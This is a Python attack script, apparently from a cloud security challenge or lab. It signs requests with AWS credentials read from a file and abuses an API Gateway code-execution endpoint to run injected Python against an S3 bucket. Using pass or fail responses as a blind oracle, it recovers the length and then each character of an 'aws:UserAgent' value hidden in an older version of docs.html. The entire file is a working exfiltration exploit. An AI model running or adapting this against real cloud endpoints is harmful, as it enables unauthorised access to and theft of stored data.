import urllib.request, json, base64, boto3, string, re
from botocore.auth import SigV4Auth
from botocore.awsrequest import AWSRequest
from botocore.credentials import Credentials

lines = open('creds.txt').read().splitlines()
ak = lines[0].split(': ')[1].strip()
sk = lines[1].split(': ')[1].strip()
tk = lines[2].split(': ')[1].strip()
creds = Credentials(ak, sk, tk)

def ask(code_str):
    url = 'https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec'
    payload = json.dumps({'code': base64.b64encode(code_str.encode()).decode()}).encode('utf-8')
    request = AWSRequest(method='POST', url=url, data=payload, headers={'Content-Type': 'application/json', 'Host': 'l8ssyaz69f.execute-api.us-east-1.amazonaws.com'})
    SigV4Auth(creds, 'execute-api', 'us-east-1').add_auth(request)
    req = urllib.request.Request(url, data=payload, headers=dict(request.headers), method='POST')
    try:
        urllib.request.urlopen(req)
        return True
    except:
        return False

print('1. Finding length of aws:UserAgent value in older docs.html...', flush=True)
ua_len = 0
for l in range(1, 100):
    if ask(f'''import boto3, re
s3 = boto3.client('s3', region_name='us-east-1')
res = s3.list_object_versions(Bucket='userd8a2f72fe43094e8')
old_vid = [v for v in res.get('Versions', []) if v['Key'] == 'docs.html' and not v['IsLatest']][0]['VersionId']
content = s3.get_object(Bucket='userd8a2f72fe43094e8', Key='docs.html', VersionId=old_vid)['Body'].read().decode('utf-8')
matches = re.findall(r'"aws:UserAgent":\\s*"([^"]+)"', content)
assert len(matches[0]) == {l}
'''):
        print('UserAgent string length:', l, flush=True)
        ua_len = l
        break

if ua_len > 0:
    print('2. Exfiltrating each character...', flush=True)
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _-./+:@!?#()[]'
    ua = ''
    for idx in range(ua_len):
        found = False
        for ch in chars:
            if ask(f'''import boto3, re
s3 = boto3.client('s3', region_name='us-east-1')
res = s3.list_object_versions(Bucket='userd8a2f72fe43094e8')
old_vid = [v for v in res.get('Versions', []) if v['Key'] == 'docs.html' and not v['IsLatest']][0]['VersionId']
content = s3.get_object(Bucket='userd8a2f72fe43094e8', Key='docs.html', VersionId=old_vid)['Body'].read().decode('utf-8')
matches = re.findall(r'"aws:UserAgent":\\s*"([^"]+)"', content)
assert matches[0][{idx}] == {repr(ch)}
'''):
                ua += ch
                print(f'Char {idx}: {repr(ch)} -> {ua}', flush=True)
                found = True
                break
        if not found:
            print(f'Char {idx} not found in ascii set!', flush=True)
    print('FINAL EXFILTRATED USER AGENT:', ua, flush=True)
else:
    print('Could not find length of UserAgent string!', flush=True)
